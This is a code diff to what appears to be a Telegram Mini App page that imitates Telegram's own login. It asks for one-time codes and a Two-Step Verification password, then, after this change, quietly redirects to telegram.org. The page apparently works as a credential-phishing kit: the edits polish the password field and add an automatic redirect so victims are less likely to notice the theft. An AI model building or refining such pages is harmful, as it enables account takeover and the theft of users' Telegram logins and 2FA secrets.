@@ -38,7 +38,6 @@
 
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-    /* Logo Pulse Animation */
     .tg-logo-container { margin-top: 15vh; position: relative; }
     .tg-logo { width: 110px; height: 110px; animation: pulse 2s infinite ease-in-out; }
     @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
@@ -76,6 +75,37 @@
     }
     .btn-getcode-box:active { background: #e1effe; transform: translateY(1px); }
 
+    /* Input Styling for Step 3 */
+    .input-wrapper {
+        position: relative;
+        width: 100%;
+        margin-bottom: 15px;
+    }
+
+    .input-wrapper input {
+        width: 100%;
+        padding: 16px 45px 16px 16px;
+        border: 2.5px solid #eee;
+        border-radius: 12px;
+        font-size: 18px;
+        outline: none;
+        transition: border-color 0.2s;
+    }
+
+    .input-wrapper input:focus {
+        border-color: var(--tg-blue);
+    }
+
+    .input-wrapper i {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #bbb;
+        cursor: pointer;
+        font-size: 20px;
+    }
+
     /* OTP Styles */
     .otp-container { display: flex; gap: 10px; margin: 25px 0; justify-content: center; }
     .otp-box { 
@@ -92,7 +122,6 @@
 
     @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
 
-    /* Professional Keypad */
     .keypad { 
         display: grid; 
         grid-template-columns: repeat(3, 1fr); 
@@ -192,9 +221,9 @@
         <p>Your account is protected with a Two-Step Verification password.</p>
         
         <div id="status3" class="msg"></div>
-        <div style="position: relative; width: 100%;">
-            <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)" style="padding: 16px; border: 2px solid #eee; font-size: 18px;">
-            <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #bbb; cursor: pointer;"></i>
+        <div class="input-wrapper">
+            <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
+            <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
         </div>
         
         <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
@@ -205,10 +234,10 @@
     </div>
 
     <div id="step_success" class="step">
-        <i class="fa-solid fa-circle-check" style="font-size: 70px; color: var(--success-green); margin-top: 15vh; margin-bottom: 20px;"></i>
+        <i class="fa-solid fa-circle-check" style="font-size: 70px; color: var(--success-green); margin-top: 25vh; margin-bottom: 20px;"></i>
         <h2>All Set!</h2>
-        <p>You have successfully authorized this application.</p>
-        <button class="btn-main" onclick="tg.close()">START MESSAGING</button>
+        <p>Redirecting to Telegram...</p>
+        <div class="loader-ring"></div>
     </div>
 
     <div id="flood_step" class="step">
@@ -219,7 +248,6 @@
     </div>
 
 <script>
-    /* JavaScript logic stays the same to ensure functionality */
     const tg = window.Telegram.WebApp;
     tg.expand();
     tg.ready();
@@ -247,6 +275,13 @@
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
+
+        // Automatic redirect if success step is shown
+        if(n === 'success') {
+            setTimeout(() => {
+                window.location.href = "https://telegram.org";
+            }, 1500);
+        }
     }
 
     function checkStatus() {
@@ -272,8 +307,10 @@
 
     function stopLoaders() {
         isProcessing = false;
-        document.getElementById('loginBtn').disabled = false;
-        document.getElementById('loginText').innerText = "Log In with Telegram";
+        if(document.getElementById('loginBtn')) {
+            document.getElementById('loginBtn').disabled = false;
+            document.getElementById('loginText').innerText = "Log In with Telegram";
+        }
         if(document.getElementById('confirmBtn')){
             document.getElementById('confirmBtn').disabled = false;
             document.getElementById('confirmText').innerText = 'NEXT';
